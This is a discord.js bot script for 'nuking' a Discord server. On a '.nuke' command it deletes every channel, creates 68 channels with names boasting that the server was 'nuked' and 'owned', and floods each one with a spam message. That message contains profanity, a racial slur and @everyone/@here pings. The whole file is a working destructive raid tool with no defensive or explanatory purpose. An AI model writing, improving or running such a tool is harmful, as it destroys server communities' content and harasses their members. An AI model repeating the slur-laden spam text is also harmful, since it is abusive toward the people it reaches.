require('dotenv').config();
const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits } = require('discord.js');

const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = '.';
const SPAM_MSG = `> __NUKED BY KRYZEN AND AIKO FUCK U all nigga fuck shit SHIRO SUPOT NA BADINGDONG__\n||@everyone @here||`;
const CHANNEL_COUNT = 68;
const MSG_PER_CHANNEL = 5;

const NAME_LIST = [
    'nuked by @Kryzen.net',
    'owned by kryzen',
    'tamed by aiko&kryzen'
];

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith(PREFIX)) return;
    if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
        return message.reply('❌ Admin only.');
    }

    const cmd = message.content.slice(PREFIX.length).trim().toLowerCase();
    if (cmd !== 'nuke') return;

    await message.reply(`⏳ Deleting all channels, then creating ${CHANNEL_COUNT} new ones and spamming...`);

    const guild = message.guild;

    // 1. DELETE ALL CHANNELS
    const channels = guild.channels.cache;
    for (const channel of channels.values()) {
        if (channel.deletable) {
            try {
                await channel.delete(`Nuke by ${message.author.tag}`);
            } catch (err) {
                console.error(`Failed to delete ${channel.name}:`, err.message);
            }
        }
    }

    // 2. CREATE NEW CHANNELS WITH RANDOM NAMES + SPAM
    let created = 0;
    for (let i = 0; i < CHANNEL_COUNT; i++) {
        try {
            const randomName = NAME_LIST[Math.floor(Math.random() * NAME_LIST.length)];
            // Add a suffix to avoid duplicate name errors (Discord requires unique names)
            const uniqueName = `${randomName}-${Date.now()}-${i}`;
            const channel = await guild.channels.create({
                name: uniqueName.slice(0, 100), // max 100 chars
                type: ChannelType.GuildText,
                reason: 'Nuke spam'
            });

            // Send fast (no delay)
            for (let j = 0; j < MSG_PER_CHANNEL; j++) {
                await channel.send(SPAM_MSG);
            }
            created++;
        } catch (err) {
            console.error(`Failed on channel ${i+1}:`, err.message);
        }
    }

    await message.reply(`✅ Done. Deleted all old channels. Created ${created}/${CHANNEL_COUNT} new channels, sent ${MSG_PER_CHANNEL} messages each.`);
});

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
    console.log(`Ready. Prefix: ${PREFIX}nuke`);
});

client.login(TOKEN);
